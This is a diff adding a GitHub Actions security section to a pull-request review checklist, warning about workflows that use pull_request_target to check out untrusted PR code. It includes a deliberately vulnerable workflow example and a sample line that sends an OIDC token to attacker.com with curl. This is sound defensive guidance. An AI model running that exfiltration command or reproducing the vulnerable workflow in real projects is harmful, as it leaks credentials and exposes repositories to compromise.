@@ -107,6 +107,101 @@ This document provides detailed criteria for reviewing pull requests. Use this a
 - [ ] No known vulnerable dependency versions
 - [ ] Minimal dependency footprint
 
+### CI/CD & GitHub Actions Security
+
+**CRITICAL**: Workflows using `pull_request_target` that checkout untrusted code are a severe security risk.
+
+#### The `pull_request_target` Anti-Pattern
+
+The following pattern is **CRITICAL** priority and often missed in reviews:
+
+```yaml
+on:
+  pull_request_target:  # ⚠️ Runs with elevated privileges
+
+jobs:
+  build:
+    permissions:
+      id-token: write      # ⚠️ Can obtain OIDC tokens
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}  # ⚠️ Checks out untrusted PR code
+      - uses: third-party/action@v1   # ⚠️ Processes untrusted code with privileges
+```
+
+**Why this is dangerous:**
+- `pull_request_target` runs workflow from base branch with access to secrets and OIDC tokens
+- Checking out PR code brings untrusted files into the workflow environment
+- Attacker controls the checked-out files and can exploit third-party actions
+
+**Attack vectors to consider:**
+
+1. **Code Execution**
+   - [ ] Action runs npm install, pip install, or other package managers
+   - [ ] Action executes scripts from the repository (setup.py, Makefile, etc.)
+   - [ ] Action processes files in ways that could trigger code execution
+
+2. **YAML/File Content Exploitation**
+   - [ ] Malicious YAML could exploit unsafe deserialization
+   - [ ] Injection attacks if file content passed to shell commands
+   - [ ] Path traversal vulnerabilities in file processing
+
+3. **OIDC Token Exfiltration**
+   - [ ] Any code execution allows: `curl attacker.com/?token=$ACTIONS_ID_TOKEN_REQUEST_TOKEN`
+   - [ ] Token accessible via environment variables and GitHub API
+   - [ ] Could be used to impersonate the repository in cloud services
+
+4. **Supply Chain Attacks**
+   - [ ] Poison SDK/package builds to inject malicious code
+   - [ ] Modify artifacts before publication
+   - [ ] Compromise downstream users of generated packages
+
+**What to verify when reviewing workflows:**
+
+- [ ] **Avoid the pattern entirely**: Can this use `pull_request` instead?
+- [ ] **Audit third-party actions**: Review the action's source code at the pinned commit
+  - What does it do with checked-out files?
+  - Does it execute any code from the repository?
+  - Does it run package managers?
+  - How does it parse YAML/config files?
+- [ ] **Verify repository settings**: Is manual approval required for fork PRs?
+  - Settings → Actions → General
+  - "Require approval for all outside collaborators" should be enabled
+- [ ] **Implement defense-in-depth**:
+  - Use sparse checkout to limit files available
+  - Add validation steps before processing untrusted files
+  - Minimize permissions granted to workflows
+- [ ] **Consider access model**: Who can trigger workflows? (In repos where anyone with 1+ merged PR can open new PRs, risk is higher)
+
+**The complete trust chain:**
+
+When a workflow uses `pull_request_target` + checkout + third-party action, you're trusting:
+1. The action never executes code from the repository
+2. The action safely parses all file formats (YAML, JSON, etc.)
+3. The action only reads specified files (no path traversal)
+4. The action doesn't leak environment variables
+5. The action doesn't pass file content to shell/system calls unsafely
+6. The action's dependencies are not compromised
+7. The pinned commit wasn't malicious when created
+8. Manual approval (if configured) actually prevents abuse
+
+**If ANY of these fail, the repository is compromised.**
+
+**Red flags requiring CRITICAL classification:**
+- `pull_request_target` + checkout of PR code + `id-token: write` permission
+- `pull_request_target` + checkout of PR code + `secrets: inherit`
+- `pull_request_target` + checkout of PR code + third-party actions processing those files
+- Comments claiming "this is safe" without verification/audit
+
+**Safer alternatives:**
+- Use `pull_request` trigger (no secrets/OIDC access)
+- Use sparse checkout to limit exposure
+- Implement separate validation job before privileged operations
+- Require explicit manual approval for all fork PRs
+
+**Remember**: A comment in the workflow saying "this is safe because the action only reads files" is NOT sufficient verification. That claim must be proven through source code audit and security review of the action.
+
 ## Performance
 
 ### Efficiency
